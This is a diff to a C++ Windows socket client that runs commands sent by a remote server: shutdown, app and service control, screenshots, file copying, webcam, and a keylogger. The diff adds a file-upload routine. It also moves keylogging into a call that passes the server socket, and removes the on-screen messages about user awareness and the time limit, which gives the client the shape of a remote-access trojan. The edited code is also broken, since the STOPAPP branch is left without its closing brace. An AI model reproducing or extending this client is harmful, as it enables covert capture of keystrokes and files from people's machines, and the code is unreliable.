@@ -140,13 +140,14 @@
 #include <chrono>
 #include <thread>
 #include<atomic>
-#include<Utility.h>
+#include "Utility.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
 using namespace std;
 
 #define bufferSize 1024
+#define BUFFER_SIZE 1024
 
 void sendFile(SOCKET serverSocket, const char* filename) {
     ifstream file(filename, ios::binary);
@@ -233,6 +234,53 @@ void sendFile(SOCKET serverSocket, const char* filename) {
 //     }
 // }
 
+void sendFile(SOCKET clientSocket, const std::string& filePath) {
+    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file." << std::endl;
+        return;
+    }
+
+    // Get file size
+    std::streamsize fileSize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Send file info header: "SendFile: filename filesize"
+    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
+    std::string fileHeader = "SendFile: " + filename + " " + std::to_string(fileSize);
+    send(clientSocket, fileHeader.c_str(), fileHeader.size(), 0);
+
+    // Wait for confirmation from the receiver
+    char ackBuffer[10];
+    recv(clientSocket, ackBuffer, sizeof(ackBuffer), 0);
+
+    // Send file contents in chunks
+    char buffer[BUFFER_SIZE];
+    std::streamsize totalSent = 0;
+    while (file) {
+        file.read(buffer, BUFFER_SIZE);
+        std::streamsize bytesToSend = file.gcount();
+
+        int bytesSent = 0;
+        while (bytesSent < bytesToSend) {
+            int sent = send(clientSocket, buffer + bytesSent, bytesToSend - bytesSent, 0);
+            if (sent == SOCKET_ERROR) {
+                std::cerr << "Error sending file." << std::endl;
+                return;
+            }
+            bytesSent += sent;
+        }
+        totalSent += bytesSent;
+    }
+
+    // Send end-of-file signal
+    std::string endSignal = "FileEnd";
+    send(clientSocket, endSignal.c_str(), endSignal.size(), 0);
+
+    file.close();
+    std::cout << "File sent successfully. Total bytes sent: " << totalSent << std::endl;
+}
+
 
 int main() {
 
@@ -270,7 +318,7 @@ int main() {
 
     sockaddr_in service;
     service.sin_family = AF_INET;
-    InetPton(AF_INET, "10.123.0.185", &service.sin_addr.s_addr);
+    InetPton(AF_INET, "127.0.0.1", &service.sin_addr.s_addr);
     service.sin_port = htons(port);
     if (connect(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
         cout << "Client: connect() - Failed to connect." << endl;
@@ -319,32 +367,22 @@ int main() {
                 if (strcmp(buffer, "SHUTDOWN") == 0) computer.shutdown();
                 else if (strcmp(buffer, "RESET") == 0) computer.reset();
                 else if (strcmp(buffer, "LISTAPP") == 0) computer.listApp();
-                else if (strcmp(buffer, "STARTAPP") == 0) computer.startApp();
-                else if (strcmp(buffer, "STOPAPP") == 0) computer.stopApp();
+                else if (strcmp(buffer, "STARTAPP") == 0) {
+                    byteCount = recv(serverSocket, buffer, bufferSize, 0);
+                    computer.startApp(buffer);
+                }
+                else if (strcmp(buffer, "STOPAPP") == 0) {
+                    computer.stopApp();
+                
                 else if (strcmp(buffer, "LISTSERVICE") == 0) computer.listService();
                 else if(strcmp(buffer, "STARTSERVICE") == 0) computer.startService();
                 else if(strcmp(buffer, "STOPSERVICE") == 0) computer.stopService();
                 else if (strcmp(buffer, "SCREENSHOT") == 0) computer.screenShot();
                 else if (strcmp(buffer, "COPYFILE") == 0) computer.copyFile();
-                else if (strcmp(buffer, "STARTWEBCAME") == 0) computer.startWebcame();
-                else if (strcmp(buffer, "STOPWEBCAME") == 0) computer.stopWebcame();
+                //else if (strcmp(buffer, "STARTWEBCAME") == 0) computer.startWebcame();
+                //else if (strcmp(buffer, "STOPWEBCAME") == 0) computer.stopWebcame();
                 else if (strcmp(buffer, "KEYLOGGER") == 0) {
-                    std::cout << "Starting keyboard input monitor...\n";
-                    std::cout << "All keyboard input will be displayed in this window.\n";
-                    std::cout << "This program runs with user awareness for input testing.\n";
-                    std::cout << "Program will stop after 10 seconds or press ESC to exit.\n\n";
-
-                    // Start monitoring thread
-                    std::thread monitorThread(keylogger);
-                    
-                    // Create another thread to stop monitoring after 10 seconds
-                    std::thread timerThread(stopAfterDelay, serverSocket);
-                    // Wait for monitoring thread to finish
-                    monitorThread.join();
-                    
-                    // Wait for timer thread to finish
-                    timerThread.join();
-                    running = true;
+                    computer.keyLogger(serverSocket);
 
                 }
             }
